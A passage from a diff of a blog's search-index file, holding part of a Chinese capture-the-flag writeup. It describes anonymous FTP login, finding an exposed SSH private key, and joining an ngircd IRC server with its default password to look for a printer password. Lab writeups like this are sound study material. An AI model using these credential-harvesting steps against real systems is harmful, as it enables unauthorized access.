+<p>ftp允许匿名登录，而后我们尝试ls、dir命令时提示</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmwaqetwhrj30ey06kgnd.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwaqetwhrj30ey06kgnd.jpg" alt="image-20210122110922874"></a></p>
+<p>百度了下，因为ftp连接方式的问题，需要开启passive mode</p>
+<p><a href="https://blog.csdn.net/qinglingls/article/details/84929754">https://blog.csdn.net/qinglingls/article/details/84929754</a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmwasu6dxbj30zg0h0gxe.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwasu6dxbj30zg0h0gxe.jpg" alt="image-20210122111142588"></a></p>
+<p>看到有很多隐藏文件，一个一个下载查看</p>
+<p>.ngircd 目录（irc服务）下有channels文件（突然兴奋</p>
+<p>.ssh下有私钥文件id_rsa</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmwb7htbdvj31280iywr6.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwb7htbdvj31280iywr6.jpg" alt="image-20210122112548122"></a></p>
+<p>先下载ngircd，这里为了方便使用Textual7使用ngircd默认密码wealllikedebian登录聊天室</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmwf3h9lsvj318g0s2tqd.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwf3h9lsvj318g0s2tqd.jpg" alt="image-20210122134019738"></a></p>
+<p>在#tormentedprinter频道找到打印机密码？</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmwf6y27vtj30rk07mn1d.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwf6y27vtj30rk07mn1d.jpg" alt="image-20210122134339965"></a></p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+</search>
